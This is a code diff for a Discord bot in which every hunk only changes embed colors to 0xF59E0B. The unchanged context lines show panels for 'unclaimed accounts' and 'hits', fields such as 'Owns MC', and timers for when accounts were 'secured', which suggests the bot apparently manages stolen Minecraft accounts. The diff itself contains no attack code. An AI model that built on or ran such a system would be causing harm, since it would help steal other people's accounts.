@@ -23,7 +23,7 @@ async function checkNotifications(client) {
           const slave = notification.userid;
 
           const embed = new EmbedBuilder()
-            .setColor(0xADD8E6)
+            .setColor(0xF59E0B)
             .setTitle(`User Notification from Bot (\`${owner}\`)`)
             .setDescription('Your settings have been changed!');
 
@@ -77,7 +77,7 @@ async function sendpermissionsembed(client, owner, slave) {
   let id = owner;
   let embed = {
     title: `User Permissions`,
-    color: 0x808080,
+    color: 0xF59E0B,
     fields: [],
     footer: {
       text: footer.text,
@@ -169,7 +169,7 @@ function initializeNotificationSystem(client, interval = 30000) {
 
 async function mainclaimembed(client) {
   let embed = new EmbedBuilder()
-    .setColor(0xb2c7e0)
+    .setColor(0xF59E0B)
     .setDescription("You can see the unclaimed accounts on this panel, manage the auto-claim below so you'll be sent your unclaimed accounts after a specific delay. This will be reported to your users!")
     .setTitle("Unclaimed Accounts Panel");
 
@@ -229,7 +229,7 @@ async function sendclaimownerembed(client, currentPage) {
       const securedAgo = `${days}d ${hours}h ${minutes}m`;
 
       const embedBuilder = new EmbedBuilder()
-        .setColor(0xb2c7e0)
+        .setColor(0xF59E0B)
         .setFields([
           { name: "Username", value: `\`\`\`${hit.acc.oldName}\`\`\``, inline: true },
           { name: "Owns MC", value: `\`\`\`${hit.acc.mc}\`\`\``, inline: true },
@@ -278,7 +278,7 @@ async function sendclaimownerembed(client, currentPage) {
       components.push(hitButtons);
     } else {
       embed = new EmbedBuilder()
-        .setColor(0xb2c7e0)
+        .setColor(0xF59E0B)
         .setTitle("No unclaimed hits found.")
         .setTimestamp(Date.now());
     }
